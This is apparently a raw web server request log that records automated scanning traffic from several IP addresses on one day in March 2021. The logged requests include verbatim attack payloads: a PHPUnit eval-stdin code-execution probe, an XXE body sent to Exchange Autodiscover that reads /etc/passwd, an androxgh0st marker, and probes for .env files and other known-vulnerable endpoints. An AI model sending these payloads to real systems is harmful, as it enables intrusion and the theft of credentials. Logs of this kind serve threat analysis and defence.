#**# 2021-03-02 13:18:57.047 [77daedddeef54034a05f271700fcc37d]
[F] - 2021-03-02 13:18:57.043
	id: null
	info: POST / 52.142.144.240 
	controller:  > 
	query: {null}
	body: 0x%5B%5D=androxgh0st
	returnCode: -1(-1)
	elapsed-time: 4ms
#**#
#**# 2021-03-02 13:20:58.830 [e5c40b4cd633405ea8da80d5a886b78b]
[F] - 2021-03-02 13:20:58.829
	id: null
	info: GET / 71.6.232.7 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:22:10.090 [0f0ff9266e5040dea21ed9028f719769]
[F] - 2021-03-02 13:22:10.089
	id: null
	info: GET /dns-query 39.96.139.143 
	controller:  > 
	query: {dns=AAABAAABAAAAAAAAA3d3dwViYWlkdQNjb20AAAEAAQ}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:23:00.718 [cf7aae2a15544ff7b4a14bfc810d755d]
[F] - 2021-03-02 13:23:00.716
	id: null
	info: POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 45.155.205.225 
	controller:  > 
	query: {null}
	body: <?=md5("phpunit")?>
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:23:00.729 [fe1b7d207fc846b5b849aadad7775fb8]
[F] - 2021-03-02 13:23:00.727
	id: null
	info: POST /api/jsonws/invoke 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:23:01.261 [01f5e011e4c0476a87882681ae1bd950]
[F] - 2021-03-02 13:23:01.259
	id: null
	info: GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 45.155.205.225 
	controller:  > 
	query: {null}
	body: <?=md5("phpunit")?>
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 13:23:01.268 [b038ed6dc2554be68ca84d5fb871d6ab]
[F] - 2021-03-02 13:23:01.267
	id: null
	info: GET /solr/admin/info/system 45.155.205.225 
	controller:  > 
	query: {wt=json}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:23:02.772 [aa442931b80d4f858a3ccbc4356f1abe]
[F] - 2021-03-02 13:23:02.770
	id: null
	info: GET /wp-content/plugins/wp-file-manager/readme.txt 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 13:23:02.830 [dbe55bf4812845e8bb20b1d7f7527659]
[F] - 2021-03-02 13:23:02.828
	id: null
	info: GET / 45.155.205.225 
	controller:  > 
	query: {XDEBUG_SESSION_START=phpstorm}
	body: 
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 13:23:03.269 [07dc5400930942639c33100c96eb56c9]
[F] - 2021-03-02 13:23:03.267
	id: null
	info: GET /console/ 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 13:23:03.328 [4ecc644dcf5144b29bb7626be5864f55]
[F] - 2021-03-02 13:23:03.326
	id: null
	info: POST /Autodiscover/Autodiscover.xml 45.155.205.225 
	controller:  > 
	query: {null}
	body: <!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
	<Request>
	<EMailAddress>aaaaa</EMailAddress>
	<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
	</Request>
	</Autodiscover>
	returnCode: -1(-1)
	elapsed-time: 2ms
#**#
#**# 2021-03-02 13:23:03.770 [543fbc665f1a4c74a80f6e58461bf307]
[F] - 2021-03-02 13:23:03.769
	id: null
	info: GET /_ignition/execute-solution 45.155.205.225 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:31:37.206 [caa20fc48eba45528b256dfae47103e9]
[F] - 2021-03-02 13:31:37.205
	id: null
	info: GET /.env 129.146.190.190 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 1ms
#**#
#**# 2021-03-02 13:44:52.214 [c53ca2099b42466f978da328c055002a]
[F] - 2021-03-02 13:44:52.211
	id: null
	info: GET /applications/updater/ver.json 87.118.116.103 
	controller:  > 
	query: {null}
	body: 
	returnCode: -1(-1)
	elapsed-time: 3ms
#**#
